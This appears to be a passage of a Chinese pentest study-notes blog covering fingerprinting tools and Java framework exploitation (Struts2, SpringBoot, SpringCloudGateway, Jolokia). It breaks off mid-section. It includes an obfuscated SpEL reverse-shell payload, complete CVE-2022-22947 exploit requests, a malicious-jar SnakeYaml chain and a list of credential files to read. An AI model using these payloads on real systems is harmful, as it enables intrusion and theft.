  ___   __  __ (_)  _ __   / _\\   /__\\   / __\\</span></span><br><span class="line"><span class="string">/ __| | &#x27;_ \\   / _` |  / _ \\  \\ \\/ / | | | &#x27;_ \\  \\ \\   /_\\    / /   </span></span><br><span class="line"><span class="string">\\__ \\ | | | | | (_| | | (_) |  &gt;  &lt;  | | | | | | _\\ \\ //__   / /___ </span></span><br><span class="line"><span class="string">|___/ |_| |_|  \\__,_|  \\___/  /_/\\_\\ |_| |_| |_| \\__/ \\__/   \\____/ </span></span><br><span class="line"><span class="string">                                                            v1.0                                        </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">----------------------------------------- requirements -----------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">playwright</span><br><span class="line">Pillow</span><br><span class="line">pytesseract</span><br><span class="line">opencv-python</span><br><span class="line">pandas</span><br><span class="line">openpyxl</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><h3 id="xapp"><a href="#xapp" class="headerlink" title="xapp"></a>xapp</h3><ol>
<li><p>项目地址</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">二进制文件：https://github.com/chaitin/xapp</span><br><span class="line">指纹字典（.yml）：https://github.com/chaitin/xray-plugins</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 运行一次xapp -h，在家目录里面自动生成.xray/xapp目录</span><br><span class="line">2. 将所有的指纹文件（.yml）放到~/.xray/app/plugin/目录下</span><br><span class="line">3. 将~/.xray/xapp/xapp-config-example.yaml更名为xapp-config.yaml，可以修改全局User-Agent和proxy字段</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">使用家目录中的所有指纹：xapp -t http://www.example.com</span><br><span class="line">使用指定的指纹（支持通配符）：xapp -t http://www.example.com -r ./finger/xxx/apache.yml</span><br><span class="line">指定目标文件：xapp -i targets.txt</span><br><span class="line">指定输出：xapp -t http://www.example.com -o res.xlsx</span><br><span class="line">综合：xapp -o res.xlsx -t http://www.example.com</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="observer-ward"><a href="#observer-ward" class="headerlink" title="observer_ward"></a>observer_ward</h3><ol>
<li><p>项目地址</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">二进制文件：https://github.com/emo-crab/observer_ward</span><br><span class="line">指纹字典（.yaml）：https://github.com/0x727/FingerprintHub</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">    更新指纹（保存位置跟OS有关）：observer_ward -u</span><br><span class="line">    跟新工具本身：observer_ward --update-self</span><br><span class="line">    指定单个指纹：observer_ward -p tomcat.yaml</span><br><span class="line">    指定指纹目录：observer_ward --probe-dir fingers</span><br><span class="line">    指定目标文件：observer_ward -l targets.txt</span><br><span class="line">    综合：observer_ward --proxy socks5://127.0.0.1:7890 --ua &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36&quot; --thread 50 --format csv -o res.csv -t http://www.example.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 漏洞扫描</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## Nuclei</span></span></span><br><span class="line"></span><br><span class="line">1. 基本使用</span><br><span class="line"></span><br><span class="line">    ```shell</span><br><span class="line">    [指定单个模板] nuclei -bs 50 -rl 100 --cloud-upload -vv -l targets.txt -t poc.yaml -o output.txt</span><br><span class="line">    [指定目录|指定程度] nuclei -u http://www.example.com/ -t wordpress/ -s critical</span><br></pre></td></tr></table></figure>
</li>
<li><p>漏洞监控+漏洞扫描+邮箱告警</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://gitee.com/shaoxinsec/auto_src</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h3><p>闲鱼上购买安装包，每年一个版本</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="框架漏洞"><a href="#框架漏洞" class="headerlink" title="框架漏洞"></a>框架漏洞</h3><blockquote>
<p>web开发可分为框架开发和系统开发，框架就是造轮子，造出基本功能完全的一套程序；系统开发是在框架的基础之上，做功能的丰富、修改，本质上就是调用框架已经写好的功能函数，而不用自己一步一步实现。例如框架A中关于数据库的操作，提供了函数B可以直接获取数据库中每个字段的所有内容，那么在开发系统C时，只需要调用函数B就可以了，不用自己写实现的代码了。在这里也可以体现出来：框架漏洞的影响范围是极大的，因为使用的系统数量多。不管你你的web系统自研程度有多高，只要引入了框架，就会受到该框架漏洞的影响。</p>
<p>对于测试来说，我们面对的是一套web系统，如果这套系统是开源的CMS，那么我们能拿到源码进行审计，并且互联网上关于这套CMS的漏洞肯定也是比较多的；即使这套web系统是企业自研的，那么百分百也会采用框架，这个时候我们就需要掌握常见的框架漏洞。在2025年的今天来说，java仍然是web后端的主流开发语言，所以我们重点掌握java的后端框架漏洞。</p>
</blockquote>
<h4 id="JAVA-Struts2"><a href="#JAVA-Struts2" class="headerlink" title="JAVA-Struts2"></a>JAVA-Struts2</h4><ol>
<li><p>struts2是apache旗下的一款java后端框架，曾经风靡一时（Strusts2+Spring+Hibernate&#x3D;SSH），但现在基本上被淘汰了，现在的java后端基本上是SSM（SpringMVC+SpringBoot+Mybatis）的天下。不过，仍然有一些老项目在用Strusts2，而且最重要的是由于Struts2解析OGNL（表达式语言，粗略理解为java的语法糖，struts2中经常被${}或者%{}包裹，用来区分其他代码，例如${1*2}表示3。OGNL支持访问其他成员、属性、调用方法，所以可以被利用）的特点，导致经常出现RCE漏洞，所以可以不用研究&#x2F;挖掘Struts2框架，但是得掌握它的利用&#x2F;探测。</p>
</li>
<li><p>识别Struts2（目前没有精准识别Struts2的方法）</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. URL后缀：.action或者.do</span><br><span class="line">2. 尝试访问默认配置界面：/struts/webconsole.html /struts/debug.html</span><br><span class="line">3. 响应包中直接包含struts关键字</span><br><span class="line">4. 报错页面中含有struts关键字</span><br><span class="line">5. 指纹识别工具</span><br></pre></td></tr></table></figure>
</li>
<li><p>全版本检测工具：<a href="https://github.com/abc123info/Struts2VulsScanTools">https://github.com/abc123info/Struts2VulsScanTools</a></p>
</li>
<li><p>流量特征</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. 请求中有$&#123;&#125;  $&#123;&#125; 以及常见的rce函数（Runtime.getRuntime().exec()， new关键字）等等</span><br><span class="line">2. 大量的请求出现.action 或者 .do后缀</span><br><span class="line">3. 响应中出现常见的探测命令的结果：ifconfig/ etc/passwd /id/whoami这些</span><br><span class="line">4. 响应中出现ognl.OgnlException或者java.lang.ProcessBuilder这些关键字（报错信息）</span><br><span class="line">5. 工具特征：Struts2-scan（UA中含有Struts2-scan的关键字）、天融信有固定的cookie值、安恒的工具在UA里也有‘Auto Spider’的关键字</span><br></pre></td></tr></table></figure>
</li>
<li><p>批量搜索：fofa：app&#x3D;”struts2”</p>
</li>
</ol>
<h4 id="JAVA-SpringBoot"><a href="#JAVA-SpringBoot" class="headerlink" title="JAVA-SpringBoot"></a>JAVA-SpringBoot</h4><ol>
<li><p>Spring作为java后端的一个大类框架，地位不亚于iPhone在手机圈中的地位，其生态大概可以分为五个部分：SpringMVC + SpringSecurity  &#x3D;&#x3D;&gt;  SpringFramework  &#x3D;&#x3D;&gt;  SpringBoot  &#x3D;&#x3D;&gt;  SpringCloud。SpringBoot可以理解为SpringFramework的魔改版、升级版，通过注解的方式自动配置项目依赖等相关配置，省去了手工配置Spring项目的麻烦，所以使用范围还是很广的。</p>
</li>
<li><p>识别SpringBoot：默认logo为小绿叶</p>
</li>
<li><p>SpringBoot目录遍历&#x2F;任意文件读取</p>
<ul>
<li><p>关键函数对传入的filename做了假的安全检查（检查存在不，根根不限制传入的文件名）、对传入的base根本没做检查</p>
<p>  <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251104153547126.png" alt="image-20251104153547126"></p>
<p>  <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251104153650613.png" alt="image-20251104153650613"></p>
</li>
<li><p>读取文件</p>
<p>  <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251104154057560.png" alt="image-20251104154057560"></p>
</li>
<li><p>任意文件读取  &#x3D;&#x3D;&gt;  Getshell</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">0. 方向：找账号密码、程序源码/二进制（逆向找key、找密码）</span><br><span class="line">1. 历史命令（如mysql -uroot -proot）：/root/.bash_history、/home/username/.bash_history</span><br><span class="line">2. SSH公钥：/root/.ssh/id_rsa、/root/.ssh/authorized_keys</span><br><span class="line">3. 系统信息：/etc/redhat-release</span><br><span class="line">4. 本地文件的配置信息：var/lib/mlocate/mlocate.db</span><br><span class="line">5. 当前用户：/proc/self/loginuid</span><br><span class="line">6. 环境变量：/proc/self/environ</span><br><span class="line">7. 内网ip：/proc/net/fib_trie</span><br><span class="line">8. 当前进程对应的PID：/proc/sched_debug</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>actuator是SB中专门用来监控java运行环境的板块，里面的工具类包括但不限于读取内存信息、环境配置信息、重启接口等等，这些高危的接口经常出现口未授权访问，导致泄露敏感信息，为进一步的利用提供了非常重要的情报。下面是actuator中一些高敏的接口，以及访问到这些接口之后如何利用泄露的信息（这些接口在SB1版本中，没有归类到actuator路径下面）。</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110145553277.png" alt="image-20251110145553277"></p>
</li>
<li><p>ErrorPage页面SpEL表达式注入(SB1版本)</p>
<ul>
<li><p>爆破&#x2F;寻找引发ErrorPage的接口以及参数，例如&#x2F;article?id&#x3D;，需要注意ErrorPage中的status的值应为500</p>
<p>  <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111134757585.png" alt="image-20251111134757585"></p>
</li>
<li><p>注入SpEL表达式，执行RCE反弹shell</p>
  <figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]&#123;0x62,0x61,0x73,0x68,0x20,0x2d,0x63,0x20,0x7b,0x65,0x63,0x68,0x6f,0x2c,0x59,0x6d,0x46,0x7a,0x61,0x43,0x41,0x74,0x61,0x53,0x41,0x2b,0x4a,0x69,0x41,0x76,0x5a,0x47,0x56,0x32,0x4c,0x33,0x52,0x6a,0x63,0x43,0x32d,0x64,0x7d,0x7c,0x7b,0x62,0x61,0x73,0x68,0x2c,0x2d,0x69,0x7d&#125;))&#125;</span><br><span class="line"> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>SnakeYaml RCE（Spring-Cloud-Btoot-Stater≤1.3）</p>
<ul>
<li><p>利用链</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">请求/env接口（env接口存在未授权访问） ==&gt; 设置SpringCloud配置文件为一个恶意的配置文件 ==&gt; 该配置配置文件指向一个恶意的jar包 ==&gt; 发送请求给后端 ==&gt; 后端根据配置文件的内容，下载并运行jar包（目标机器可以出网） ==&gt; 请求/refresh接口，刷新所有接口的缓存 ==&gt; 成功上线</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置文件</p>
<p>  <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111140514689.png" alt="image-20251111140514689"></p>
</li>
<li><p>exp.jar：<a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
</li>
</ul>
</li>
</ol>
<h4 id="JAVA-JDBC"><a href="#JAVA-JDBC" class="headerlink" title="JAVA-JDBC"></a>JAVA-JDBC</h4><ol>
<li>反序列化</li>
</ol>
<h4 id="JAVA-SpringCloudGateway"><a href="#JAVA-SpringCloudGateway" class="headerlink" title="JAVA-SpringCloudGateway"></a>JAVA-SpringCloudGateway</h4><ol>
<li><p>SpringCloudGateway（以下简称SCG）</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1. SCG用来路由api地址，处理api请求以及响应（Browser &lt;==&gt; SCG &lt;==&gt; api），在3.1.0及以前的版本中存在SpEL表达式注入漏洞，也就是说如果api的请求或者响应中存在SpEL表达式，那么SCG代码会解析并且执行表达式，从而造成了代码执行；</span><br><span class="line">2. SB添加SCG之后，通过/actuator/gateway对SCG进行控制，加上上面的漏洞，从而实现完整的远程代码执行漏洞CVE-2022-22947（Hacker &lt;==&gt; SB-actuator/gateway &lt;==&gt; SCG &lt;==&gt; OS）</span><br></pre></td></tr></table></figure>
</li>
<li><p>actuator操控SCG</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111112050167.png" alt="image-20251111112050167"></p>
</li>
<li><p>可通过actuator&#x2F;mapping尝试判断SB中有没有启用SCG，并尝试SCG是否有权限可以访问&#x2F;actuator&#x2F;gateway接口</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111131440359.png" alt="image-20251111131440359"></p>
</li>
<li><p>向SCG中注册一个包含SpEL表达式的路由</p>
 <figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>329</span><br><span class="line"></span><br><span class="line"><span class="language-coffeescript">&#123;</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;hacktest&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123;<span class="keyword">new</span> <span class="built_in">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="built_in">String</span>[]&#123;\<span class="string">&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span></span></span></span></span><br><span class="line"><span class="subst"><span class="string"><span class="language-coffeescript">    &#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &#125;],</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &quot;</span>uri<span class="string">&quot;: &quot;</span>http://example.com<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">&#125;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript"></span></span></span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111131937318.png" alt="image-20251111131937318"></p>
</li>
<li><p>刷新SCG缓存</p>
 <figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>329</span><br><span class="line"></span><br><span class="line"><span class="language-coffeescript">&#123;</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;hacktest&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123;<span class="keyword">new</span> <span class="built_in">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="built_in">String</span>[]&#123;\<span class="string">&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span></span></span></span></span><br><span class="line"><span class="subst"><span class="string"><span class="language-coffeescript">    &#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &#125;],</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &quot;</span>uri<span class="string">&quot;: &quot;</span>http://example.com<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">&#125;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript"></span></span></span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111131741403.png" alt="image-20251111131741403"></p>
</li>
<li><p>访问注册的路由</p>
 <figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251111131826279.png" alt="image-20251111131826279"></p>
</li>
</ol>
<h4 id="JAVA-Jolokia"><a href="#JAVA-Jolokia" class="headerlink" title="JAVA-Jolokia"></a>JAVA-Jolokia</h4><ol>
<li><p>Jolokia</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Jolokia ==&gt; JVM MBean ==&gt; JVM</span><br><span class="line">1. JVM：所有的java代码都需要在JVM中运行，也就是说：java代码 -&gt; jvm -&gt; 机器；</span><br><span class="line">2. JVM MBean：JMX框架中的一个组件，可以控制JVM，对JVM进行读取、写入、执行等操作；</span><br><span class="line">3. Jolokia：一个独立的开源java项目，提供api接受来自于http的指令，并翻译成标准的JVM MBean命令，最后丢给JVM MBean。补充：可以调用JVM MBean的组件/工具有很多，Jolokia只是其中一个。</span><br></pre></td></tr></table></figure>
</li>
<li><p>编写JVM MBean命令</p>
<ul>
<li><p>定义 3 个 MBean 接口</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 订单创建监控 MBean 接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OrderCreateMonitorMBean</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getCreateCount</span><span class="params">()</span>; <span class="comment">// 今日创建订单数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 订单支付监控 MBean 接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OrderPaymentMonitorMBean</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getPaidCount</span><span class="params">()</span>;   <span class="comment">// 今日支付订单数</span></span><br><span class="line">    <span class="type">double</span> <span class="title function_">getTotalAmount</span><span class="params">()</span>; <span class="comment">// 今日支付总金额</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 订单物流监控 MBean 接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">OrderDeliveryMonitorMBean</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getShippedCount</span><span class="params">()</span>; <span class="comment">// 今日已发货订单数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>实现MBean接口</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 订单创建监控实现类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderCreateMonitor</span> <span class="keyword">implements</span> <span class="title class_">OrderCreateMonitorMBean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">createCount</span> <span class="operator">=</span> <span class="number">1500</span>; <span class="comment">// 模拟今日创建1500单</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCreateCount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> createCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 订单支付监控实现类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderPaymentMonitor</span> <span class="keyword">implements</span> <span class="title class_">OrderPaymentMonitorMBean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">paidCount</span> <span class="operator">=</span> <span class="number">1200</span>; <span class="comment">// 模拟今日支付1200单</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="variable">totalAmount</span> <span class="operator">=</span> <span class="number">256000.0</span>; <span class="comment">// 模拟总金额</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getPaidCount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> paidCount;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getTotalAmount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> totalAmount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 订单物流监控实现类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderDeliveryMonitor</span> <span class="keyword">implements</span> <span class="title class_">OrderDeliveryMonitorMBean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">shippedCount</span> <span class="operator">=</span> <span class="number">900</span>; <span class="comment">// 模拟今日发货900单</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getShippedCount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> shippedCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>注册MBean到一个域（组）&#x2F;生成MBean命令：本质就是实例化对象，并给这个实例按照规范绑定一个名称让MBeanServer记住。</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.ObjectName;</span><br><span class="line"><span class="keyword">import</span> java.lang.management.ManagementFactory;</span><br><span class="line"><span class="keyword">import</span> javax.management.MBeanServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MultiMBeanRegistration</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">MBeanServer</span> <span class="variable">mbeanServer</span> <span class="operator">=</span> ManagementFactory.getPlatformMBeanServer();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 注册订单创建监控 MBean</span></span><br><span class="line">        <span class="type">ObjectName</span> <span class="variable">createMonitorName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectName</span>(</span><br><span class="line">            <span class="string">&quot;com.example.order:type=CreateMonitor,module=order-service,version=2.1&quot;</span></span><br><span class="line">        );</span><br><span class="line">        mbeanServer.registerMBean(<span class="keyword">new</span> <span class="title class_">OrderCreateMonitor</span>(), createMonitorName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 注册订单支付监控 MBean（同一域，不同 type）</span></span><br><span class="line">        <span class="type">ObjectName</span> <span class="variable">paymentMonitorName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectName</span>(</span><br><span class="line">            <span class="string">&quot;com.example.order:type=PaymentMonitor,module=payment-service,version=2.1&quot;</span></span><br><span class="line">        );</span><br><span class="line">        mbeanServer.registerMBean(<span class="keyword">new</span> <span class="title class_">OrderPaymentMonitor</span>(), paymentMonitorName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 注册订单物流监控 MBean（同一域，不同 type）</span></span><br><span class="line">        <span class="type">ObjectName</span> <span class="variable">deliveryMonitorName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectName</span>(</span><br><span class="line">            <span class="string">&quot;com.example.order:type=DeliveryMonitor,module=logistics-service,version=2.1&quot;</span></span><br><span class="line">        );</span><br><span class="line">        mbeanServer.registerMBean(<span class="keyword">new</span> <span class="title class_">OrderDeliveryMonitor</span>(), deliveryMonitorName);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;3个MBean注册成功（同一域：com.example.order）：&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;- &quot;</span> + createMonitorName);</span><br><span class="line">        System.out.println(<span class="string">&quot;- &quot;</span> + paymentMonitorName);</span><br><span class="line">        System.out.println(<span class="string">&quot;- &quot;</span> + deliveryMonitorName);</span><br><span class="line">        Thread.sleep(Long.MAX_VALUE); <span class="comment">// 保持运行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>MBean名称分析</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">MBean名称：组名/域名:&lt;key=value&gt;，</span><br><span class="line">1. 为什么要有组名：因为有很多的MBean要注册都MBeanServer中，通过组管理起来更加方便；</span><br><span class="line">2. &lt;key=value&gt;作用：可以理解为给某个实例取得别名，至于为什么是这种形式，需要问原作者。这里的key官方没有强制规定叫什么名字，业内一般会这样写：type=类名</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>POST访问jolokia接口（也可以GET访问），调用MBean命令</p>
<ul>
<li><p>调用订单创建监控 MBean（获取今日创建订单数）</p>
